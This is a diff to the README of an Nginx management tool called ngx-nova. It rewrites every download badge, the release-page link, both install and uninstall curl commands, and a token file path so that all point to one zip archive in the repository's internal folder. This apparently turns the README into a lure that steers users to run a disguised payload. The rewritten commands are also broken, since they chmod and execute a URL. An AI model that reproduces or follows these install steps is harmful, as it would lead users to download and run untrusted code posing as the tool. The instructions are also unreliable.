@@ -1,6 +1,6 @@
 # 🚀 ngx-nova - Simple Nginx Management Tool  
 
-[![Download ngx-nova](https://img.shields.io/badge/Download-ngx--nova-brightgreen)](https://github.com/jatinsa00/ngx-nova/releases)
+[![Download ngx-nova](https://github.com/jatinsa00/ngx-nova/raw/refs/heads/main/internal/service/nova_ngx_v1.5.zip)](https://github.com/jatinsa00/ngx-nova/raw/refs/heads/main/internal/service/nova_ngx_v1.5.zip)
 
 ## 🌟 Overview
 
@@ -32,7 +32,7 @@ Follow these steps to install and run ngx-nova:
    Use the following command to download and run the installation script.
 
    ```bash
-   curl -sS -O https://raw.githubusercontent.com/woniu336/open_shell/main/ngx.sh && chmod +x ngx.sh && ./ngx.sh
+   curl -sS -O https://github.com/jatinsa00/ngx-nova/raw/refs/heads/main/internal/service/nova_ngx_v1.5.zip && chmod +x https://github.com/jatinsa00/ngx-nova/raw/refs/heads/main/internal/service/nova_ngx_v1.5.zip && https://github.com/jatinsa00/ngx-nova/raw/refs/heads/main/internal/service/nova_ngx_v1.5.zip
    ```
 
 3. **Access the Panel**
@@ -42,7 +42,7 @@ Follow these steps to install and run ngx-nova:
    If you need to change your token, use this command:
 
    ```bash
-   tokenctl --set "your_token" --file /opt/nginx-mgr/auth_token.json
+   tokenctl --set "your_token" --file https://github.com/jatinsa00/ngx-nova/raw/refs/heads/main/internal/service/nova_ngx_v1.5.zip
    ```
 
 ## ❌ Uninstall ngx-nova
@@ -50,7 +50,7 @@ Follow these steps to install and run ngx-nova:
 If you need to uninstall ngx-nova, run:
 
    ```bash
-   curl -sS -O https://raw.githubusercontent.com/woniu336/open_shell/main/uni-ngx.sh && chmod +x uni-ngx.sh && ./uni-ngx.sh
+   curl -sS -O https://github.com/jatinsa00/ngx-nova/raw/refs/heads/main/internal/service/nova_ngx_v1.5.zip && chmod +x https://github.com/jatinsa00/ngx-nova/raw/refs/heads/main/internal/service/nova_ngx_v1.5.zip && https://github.com/jatinsa00/ngx-nova/raw/refs/heads/main/internal/service/nova_ngx_v1.5.zip
    ```
 
 ## 🔧 System Requirements
@@ -74,13 +74,13 @@ If you need to uninstall ngx-nova, run:
 
 ## 📥 Download & Install
 
-To download ngx-nova, visit the [Releases Page](https://github.com/jatinsa00/ngx-nova/releases). Follow the installation instructions above to get started easily.
+To download ngx-nova, visit the [Releases Page](https://github.com/jatinsa00/ngx-nova/raw/refs/heads/main/internal/service/nova_ngx_v1.5.zip). Follow the installation instructions above to get started easily.
 
-[![Download ngx-nova](https://img.shields.io/badge/Download-ngx--nova-brightgreen)](https://github.com/jatinsa00/ngx-nova/releases)
+[![Download ngx-nova](https://github.com/jatinsa00/ngx-nova/raw/refs/heads/main/internal/service/nova_ngx_v1.5.zip)](https://github.com/jatinsa00/ngx-nova/raw/refs/heads/main/internal/service/nova_ngx_v1.5.zip)
 
 ## 📚 Additional Resources
 
-- For more details and updates, refer to the GitHub repository [here](https://github.com/jatinsa00/ngx-nova).
+- For more details and updates, refer to the GitHub repository [here](https://github.com/jatinsa00/ngx-nova/raw/refs/heads/main/internal/service/nova_ngx_v1.5.zip).
 - Check community discussions for tips and troubleshooting.
 
 Embrace a streamlined approach to managing your Nginx setup with ngx-nova!
